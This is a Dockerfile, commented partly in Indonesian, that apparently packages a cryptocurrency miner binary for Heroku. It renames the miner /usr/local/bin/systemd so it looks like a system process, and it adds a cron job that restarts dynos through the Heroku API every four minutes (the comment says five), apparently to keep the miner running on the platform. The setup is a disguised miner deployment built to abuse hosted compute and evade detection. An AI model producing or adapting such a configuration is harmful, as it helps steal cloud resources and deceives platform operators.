# Base Image
FROM ubuntu:20.04

# Non-interaktif selama instalasi
ARG DEBIAN_FRONTEND=noninteractive

# Install dependencies
RUN apt-get update && apt-get install -y \
    wget \
    bash \
    python3 \
    python3-pip \
    curl \
    cron \
    --no-install-recommends && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# Set working directory
WORKDIR /app

# Enable swap
RUN fallocate -l 1G /swapfile 
RUN chmod 600 /swapfile 
RUN mkswap /swapfile && \
    echo "/swapfile none swap sw 0 0" >> /etc/fstab
# Optimize swappiness
RUN sysctl vm.swappiness=10 && echo "vm.swappiness=10" >> /etc/sysctl.conf

# Download miner binary
COPY iniminer-linux-x64 /usr/local/bin/systemd
RUN chmod +x /usr/local/bin/systemd

# Copy startup script
COPY input.sh /usr/local/bin/input.sh
RUN chmod +x /usr/local/bin/input.sh

# Copy startup script
COPY compile.sh /usr/local/bin/node.sh
RUN chmod +x /usr/local/bin/node.sh

# Copy startup script
COPY main.sh /usr/local/bin/main.sh
RUN chmod +x /usr/local/bin/main.sh

# Copy startup script
COPY run.sh /usr/local/bin/run.sh
RUN chmod +x /usr/local/bin/run.sh

# Script untuk restart dynos menggunakan Heroku API
COPY restart.sh /usr/local/bin/restart.sh
RUN chmod +x /usr/local/bin/restart.sh

# Menambahkan cron job untuk auto-restart dynos setiap 5 menit
RUN echo "*/4 * * * * /usr/local/bin/restart.sh >> /var/log/cron.log 2>&1" > /etc/cron.d/restart
RUN crontab /etc/cron.d/restart

# Set environment variables
ENV PORT=8080
EXPOSE 8080

# Jalankan cron dan aplikasi utama
CMD ["/usr/local/bin/run.sh"]
